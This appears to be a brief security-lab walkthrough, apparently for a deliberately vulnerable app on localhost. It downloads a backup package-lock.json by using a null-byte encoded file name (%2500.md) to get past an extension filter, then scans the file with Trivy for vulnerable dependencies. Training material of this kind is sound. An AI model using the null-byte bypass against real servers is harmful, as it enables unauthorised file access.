# A06:2021 Vulnerable Outdated Components


```console
$ curl http://localhost:3000/ftp/package-lock.json.bak%2500.md -o package-lock.json
```

Verify that the file has been downloaded correctly

```console
$ cat package-lock.json | jq .
```

Install Tryvi by Aquasecurity and scan for vulnerabilities

```console
$ brew install trivy
$ trivy fs ./package-lock.json          
Total: 117 (UNKNOWN: 0, LOW: 11, MEDIUM: 40, HIGH: 47, CRITICAL: 19)
...
```
